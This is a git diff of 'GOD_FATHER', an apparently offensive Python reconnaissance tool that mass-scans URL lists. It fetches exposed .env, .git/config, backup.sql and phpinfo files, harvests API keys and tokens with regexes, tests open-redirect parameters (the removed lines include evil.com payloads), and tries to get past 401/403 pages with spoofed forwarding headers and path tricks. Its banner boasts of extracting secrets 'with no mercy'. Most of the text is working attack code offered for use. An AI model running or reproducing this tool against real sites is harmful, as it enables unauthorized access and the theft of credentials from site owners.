@@ -4,28 +4,27 @@ import argparse
 import urllib3
 import os
 import sys
+import threading
+import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
 from colorama import Fore, init, Style
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
 
 session = requests.Session()
-adapter = requests.adapters.HTTPAdapter(
-    pool_connections=1000, 
-    pool_maxsize=1500, 
-    max_retries=0
-)
+adapter = requests.adapters.HTTPAdapter(pool_connections=1000, pool_maxsize=1500, max_retries=0)
 session.mount('http://', adapter)
 session.mount('https://', adapter)
 
 stats = {"ep": 0, "ky": 0, "or": 0, "bp": 0, "sf": 0, "scanned": 0, "total": 0, "live": 0}
-seen_secrets = set() 
-seen_paths = set() 
+seen_secrets = set()
+seen_paths = set()
 processed_urls = set()
+p_lock = threading.Lock()
 
-OR_PAYLOADS = ["https://www.bing.com", "//www.bing.com", "/\\/bing.com", "/%0d%0abing.com"]
+OR_PAYLOADS = ["https://bing.com", "//bing.com", "/\\/bing.com"]
 BYPASS_HEADERS = [
     {'X-Forwarded-For': '127.0.0.1'}, {'X-Forwarded-Host': '127.0.0.1'},
     {'X-Original-URL': '/admin'}, {'X-Rewrite-URL': '/admin'},
@@ -33,18 +32,28 @@ BYPASS_HEADERS = [
 ]
 
 def print_banner():
-    banner = f"""
-{Fore.RED}    ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
-{Fore.RED}    ██╔════╝ ██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗
-{Fore.RED}    ██║  ███╗██║   ██║██║  ██║█████╗  ███████║   ██║   ███████║█████╗  ██████╔╝
-{Fore.RED}    ██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
-{Fore.RED}    ╚██████╔╝╚██████╔╝██████╔╝██║      ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
-{Fore.WHITE}    -----------------------------------------------------------------------
-{Fore.YELLOW}      SENSITIVE DATA CAN HIDE, BUT IT CAN'T ESCAPE THE GODFATHER.
-{Fore.CYAN}                 MADE BY DHARMVEER | GOD-FATHER V16.0
-    """
-    print(banner)
+    b = f"""{Fore.RED}{Style.BRIGHT}
+  ▄██████▄   ▄██████▄  ████████▄   ▄████████  ▄██████▄  ██████████  ███    █▄  ████████  ████████▄ 
+ ███    ███ ███    ███ ███    ███  ███        ███    ███     ███     ███    ███ ███       ███   ▀███
+ ███    █▀  ███    ███ ███    ███  ███        ███    ███     ███     ███    ███ ███       ███    ███
+ ███        ███    ███ ███    ███ ▄███▄▄▄     ███▄▄▄▄███     ███     ███▄▄▄▄███ ███▄▄▄     ████████▀ 
+ ███   ████ ███    ███ ███    ███  ▀▀███▀▀▀   ███▀▀▀▀███     ███     ███▀▀▀▀███ ███▀▀▀     ███  ▀███ 
+ ███    ██  ███    ███ ███    ███  ███        ███    ███     ███     ███    ███ ███       ███    ███
+ ████████▀   ▀██████▀  ████████▀   ███        ███    █▀      ███     ███    █▀  ████████  ███    █▀  
 
+{Fore.RED}══════════════════════════════════════════════════════════════════════════════════════════════════
+{Fore.RED}{Style.BRIGHT}   [!] SENSITIVE DATA CAN HIDE, BUT IT CAN'T ESCAPE THE GODFATHER.
+{Fore.RED}══════════════════════════════════════════════════════════════════════════════════════════════════
+
+{Fore.RED}   {Fore.WHITE}»{Fore.RED} SECRETS WILL BE EXTRACTED           {Fore.WHITE}AUTHOR  :{Fore.RED} DHARMVEER
+{Fore.RED}   {Fore.WHITE}»{Fore.RED} MISCONFIGURATIONS WILL BE EXPLOITED {Fore.WHITE}VERSION :{Fore.RED} GOD-FATHER v16.0
+{Fore.RED}   {Fore.WHITE}»{Fore.RED} SILENCE WILL NOT SAVE YOU           {Fore.WHITE}MODE    :{Fore.RED} NO RULES • NO MERCY
+
+{Fore.RED}────────────────────────────────────────
+{Fore.RED}   STATUS : {Fore.GREEN}ACTIVE HUNTING {Fore.RED}──► {Fore.WHITE}TARGETS WILL BLEED DATA
+{Fore.RED}══════════════════════════════════════════════════════════════════════════════════════════════════
+{Style.RESET_ALL}"""
+    print(b)
 
 def update_script():
     repo_url = "https://raw.githubusercontent.com/D-666-V/THE_GOD_FATHER/main/GOD_FATHER.py"
@@ -63,20 +72,26 @@ def update_script():
     sys.exit(1)
 
 def update_status():
-    perc = (stats['scanned'] / stats['total']) * 100 if stats['total'] > 0 else 0
-    status_line = f"\r\033[K{Fore.BLUE}[{stats['scanned']}/{stats['total']}] {perc:.1f}% - {Fore.GREEN}Live:{stats['live']} {Fore.CYAN}EP:{stats['ep']} {Fore.RED}KY:{stats['ky']} {Fore.MAGENTA}OR:{stats['or']} {Fore.YELLOW}BP:{stats['bp']} {Fore.GREEN}SF:{stats['sf']}"
-    sys.stdout.write(status_line)
-    sys.stdout.flush()
+    with p_lock:
+        perc = (stats['scanned'] / stats['total']) * 100 if stats['total'] > 0 else 0
+        status_line = f"\r\033[K{Fore.BLUE}[{stats['scanned']}/{stats['total']}] {perc:.1f}% - {Fore.GREEN}Live:{stats['live']} {Fore.CYAN}EP:{stats['ep']} {Fore.RED}KY:{stats['ky']} {Fore.MAGENTA}OR:{stats['or']} {Fore.YELLOW}BP:{stats['bp']} {Fore.GREEN}SF:{stats['sf']}"
+        sys.stdout.write(status_line)
+        sys.stdout.flush()
 
 def log_result(label, value, source_url, color=Fore.WHITE, is_vuln=False):
-    if label == "CLOUD_KEY":
-        output = f"{color}[{label}] {Fore.WHITE}{value} | {Fore.CYAN}{source_url}"
-    elif is_vuln:
-        output = f"{Fore.MAGENTA}!!! [VULNERABLE-OR] {value} !!!"
-    else:
-        output = f"{color}[{label}] {value}"
-    
-    sys.stdout.write(f"\r\033[K{output}\n")
+    with p_lock:
+        if "ENDPOINT" in label or "GOLDMINE-EP" in label: stats["ep"] += 1
+        elif "OR" in label: stats["or"] += 1
+        elif "BP" in label: stats["bp"] += 1
+        elif "SENS-FILE" in label: stats["sf"] += 1
+        elif any(k in label for k in ["KEY", "TOKEN"]): stats["ky"] += 1
+        
+        sys.stdout.write("\r\033[K")
+        if is_vuln:
+            output = f"{Fore.MAGENTA}!!! [VULNERABLE-{label}] {value} !!!"
+        else:
+            output = f"{color}[{label}] {value}"
+        sys.stdout.write(f"{output}\n")
     update_status()
 
 def save_to_file(output_file, data_type, value, source):
@@ -90,23 +105,21 @@ def test_or_poc(url, output_file):
         if not parsed_url.query: return
         params = parse_qs(parsed_url.query)
         target_keys = ['url', 'redirect', 'next', 'dest', 'path', 'uri', 'to', 'out', 'domain', 'host']
-        EVIL_PAYLOADS = ["https://evil.com", "//evil.com", "/\\/evil.com", "https://evil.com%0d%0a.whitelisted.com"]
+        rand_dom = f"gf{uuid.uuid4().hex[:6]}.com"
+        payload = f"https://{rand_dom}"
         for key in params:
             if any(tk in key.lower() for tk in target_keys):
                 orig_val = params[key]
-                for payload in EVIL_PAYLOADS:
-                    params[key] = [payload]
-                    test_url = urlunparse(parsed_url._replace(query=urlencode(params, doseq=True)))
-                    try:
-                        r = session.get(test_url, timeout=4, verify=False, allow_redirects=False)
-                        loc = r.headers.get('Location', '')
-                        if r.status_code in [301, 302, 303, 307, 308] and "evil.com" in loc:
-                            log_result("VULN-OR", test_url, url, Fore.MAGENTA + Style.BRIGHT, is_vuln=True)
-                            stats["or"] += 1
-                            save_to_file(output_file, "OPEN-REDIRECT", test_url, url)
-                            params[key] = orig_val
-                            return 
-                    except: pass
+                params[key] = [payload]
+                test_url = urlunparse(parsed_url._replace(query=urlencode(params, doseq=True)))
+                try:
+                    r = session.get(test_url, timeout=5, verify=False, allow_redirects=False)
+                    loc = r.headers.get('Location', '')
+                    if r.status_code in [301, 302, 303, 307, 308] and rand_dom in loc:
+                        log_result("OR", test_url, url, Fore.MAGENTA + Style.BRIGHT, is_vuln=True)
+                        save_to_file(output_file, "OPEN-REDIRECT", test_url, url)
+                        return
+                except: pass
                 params[key] = orig_val
     except: pass
 
@@ -115,22 +128,21 @@ def try_bypass(url, output_file):
         original_r = session.get(url, timeout=4, verify=False, allow_redirects=False)
         orig_status = original_r.status_code
         orig_size = len(original_r.content)
-    except: return False
-    if orig_status == 200: return False
-    fuzz_paths = [url, url + "/%2e/", url + "..;/"] 
-    for f_path in fuzz_paths:
-        for header in BYPASS_HEADERS:
-            try:
-                r = session.get(f_path, headers=header, timeout=4, verify=False, allow_redirects=False)
-                if r.status_code == 200 and len(r.content) != orig_size and len(r.content) > 100:
-                    low_content = r.text.lower()
-                    bad_keywords = ["access denied", "forbidden", "unauthorized", "login", "signin"]
-                    if not any(word in low_content for word in bad_keywords):
-                        log_result("BP-SUCCESS", f"{f_path} (Header: {list(header.keys())[0]})", url, Fore.YELLOW + Style.BRIGHT)
-                        stats["bp"] += 1
-                        save_to_file(output_file, "BYPASS-SUCCESS", f_path, f"Header: {list(header.keys())[0]}")
-                        return True
-            except: pass
+        if orig_status == 200: return False
+        f_paths = [url, url + "/%2e/", url + "..;/"] 
+        for f_path in f_paths:
+            for header in BYPASS_HEADERS:
+                try:
+                    r = session.get(f_path, headers=header, timeout=4, verify=False, allow_redirects=False)
+                    if r.status_code == 200 and len(r.content) != orig_size and len(r.content) > 100:
+                        low_content = r.text.lower()
+                        bad_keywords = ["access denied", "forbidden", "unauthorized", "login", "signin"]
+                        if not any(word in low_content for word in bad_keywords):
+                            log_result("BP-SUCCESS", f"{f_path} (Header: {list(header.keys())[0]})", url, Fore.YELLOW + Style.BRIGHT)
+                            save_to_file(output_file, "BYPASS-SUCCESS", f_path, f"Header: {list(header.keys())[0]}")
+                            return True
+                except: pass
+    except: pass
     return False
 
 def scan_logic(content, source_url, output_file, args):
@@ -151,8 +163,8 @@ def scan_logic(content, source_url, output_file, args):
             label = "GOLDMINE-EP" if is_gold else "ENDPOINT"
             color = Fore.CYAN + Style.BRIGHT if is_gold else Fore.CYAN
             log_result(label, val, source_url, color)
-            stats["ep"] += 1
             save_to_file(output_file, label, val, source_url)
+            
     if args.ky or args.all:
         patterns = {
             "GOOGLE_KEY": r'\bAIza[0-9A-Za-z\-_]{35}\b',
@@ -166,7 +178,6 @@ def scan_logic(content, source_url, output_file, args):
                     display_msg = f"{m} {Fore.WHITE}at {Fore.BLUE}{source_url}"
                     log_result(label, display_msg, source_url, Fore.RED + Style.BRIGHT)
                     seen_secrets.add(m)
-                    stats["ky"] += 1
                     save_to_file(output_file, label, m, f"Found at: {source_url}")
 
 def process_url(url, args):
@@ -176,40 +187,40 @@ def process_url(url, args):
         if args.sf or args.all:
             parsed = urlparse(url)
             base = f"{parsed.scheme}://{parsed.netloc}"
-            fuzz_paths = ['.env', '.git/config', 'phpinfo.php', 'config.json', 'backup.sql', 'Dockerfile']
-            for sf_p in fuzz_paths:
+            fuzz_p = {
+                '.env': ['DB_HOST=', 'AWS_ACCESS_KEY', 'DB_PASSWORD=', 'APP_KEY='],
+                '.git/config': ['[core]', 'repositoryformatversion'],
+                'phpinfo.php': ['php version', 'system', 'build date'],
+                'config.json': ['{', '"'],
+                'backup.sql': ['insert into', 'create table'],
+                'Dockerfile': ['from ', 'run ', 'expose ']
+            }
+            for sf_p, sigs in fuzz_p.items():
                 f_url = f"{base.rstrip('/')}/{sf_p.lstrip('/')}"
                 if f_url in processed_urls: continue
                 processed_urls.add(f_url)
                 try:
-                    sr = session.get(f_url, timeout=3, verify=False, allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0'}, stream=True)
+                    sr = session.get(f_url, timeout=4, verify=False, allow_redirects=False)
                     if sr.status_code == 200:
-                        content_sample = sr.raw.read(1000).decode('utf-8', errors='ignore').lower()
-                        forbidden = ["access denied", "forbidden", "unauthorized", "waf", "security challenge"]
-                        not_found = ["page not found", "not found", "404", "doesn't exist", "invalid request"]
-                        c_len = int(sr.headers.get('Content-Length', 0))
-                        if (c_len > 500 or len(content_sample) > 500):
-                            if not any(w in content_sample for w in forbidden) and not any(nf in content_sample for nf in not_found):
-                                if "<html>" not in content_sample or "json" in f_url or "phpinfo" in f_url:
-                                    log_result("SENS-FILE", f_url, url, Fore.GREEN + Style.BRIGHT)
-                                    stats["sf"] += 1
-                                    save_to_file(args.output, "SENSITIVE-FILE", f_url, "Auto-Fuzz")
-                except: pass   
+                        c_text = sr.text.lower()
+                        c_type = sr.headers.get('Content-Type', '').lower()
+                        if "html" not in c_type and any(s.lower() in c_text for s in sigs):
+                            if len(sr.content) > 10:
+                                log_result("SENS-FILE", f_url, url, Fore.GREEN + Style.BRIGHT)
+                                save_to_file(args.output, "SENSITIVE-FILE", f_url, "Verified-Hit")
+                except: pass
+
         if args.poc or args.all: test_or_poc(url, args.output)
         r = session.get(url, timeout=5, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
         if r.status_code == 200:
-            if args.verify: stats["live"] += 1
-            if any(x in url.lower() for x in ['.env', 'config.json', 'phpinfo.php', 'backup.sql']):
-                c_text = r.text.lower()
-                if len(r.content) > 100 and not any(w in c_text for w in ["access denied", "forbidden"]):
-                    log_result("SENS-FILE", url, url, Fore.GREEN + Style.BRIGHT)
-                    stats["sf"] += 1
-                    save_to_file(args.output, "SENSITIVE-FILE", url, "Direct-Hit")
+            if args.verify:
+                with p_lock: stats["live"] += 1
             scan_logic(r.text, url, args.output, args)
         elif r.status_code in [401, 403] and (args.bp or args.all):
             try_bypass(url, args.output)
     except: pass
-    stats["scanned"] += 1
+    with p_lock: stats["scanned"] += 1
+    update_status()
 
 def main():
     parser = argparse.ArgumentParser(add_help=False)
@@ -226,14 +237,9 @@ def main():
     parser.add_argument("-all", action="store_true")
     parser.add_argument("-up", "--update", action="store_true") 
     parser.add_argument("-h", "--help", action="store_true")
-
     args = parser.parse_args()
-
-    if args.update:
-        update_script()
-
+    if args.update: update_script()
     print_banner()
-
     if args.help or not args.input:
         help_menu = f"""
 {Fore.RED}{Style.BRIGHT}USAGE: python3 GOD_FATHER.py -i <urls.txt> [OPTIONS]
@@ -259,22 +265,18 @@ def main():
         """
         print(help_menu)
         sys.exit(0)
-
-    else:
-        try:
-            with open(args.input, 'r', encoding='utf-8', errors='ignore') as f:
-                urls = list(set(line.strip() for line in f if line.strip()))
-            
-            stats["total"] = len(urls)
-            with ThreadPoolExecutor(max_workers=args.threads) as executor:
-                futures = {executor.submit(process_url, url, args): url for url in urls}
-                for future in as_completed(futures): update_status()
-            
-            print(f"\n\n{Fore.GREEN} GOD-FATHER HUNTING COMPLETE")
-
-        except Exception as e:
-            print(f"{Fore.RED}[!] Error: {str(e)}")
-            sys.exit(1)
+    try:
+        with open(args.input, 'r', encoding='utf-8', errors='ignore') as f:
+            urls = list(set(line.strip() for line in f if line.strip()))
+        stats["total"] = len(urls)
+        update_status()
+        with ThreadPoolExecutor(max_workers=args.threads) as executor:
+            futures = [executor.submit(process_url, url, args) for url in urls]
+            for future in as_completed(futures): pass
+        print(f"\n\n{Fore.GREEN} GOD-FATHER HUNTING COMPLETE")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error: {str(e)}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     try:
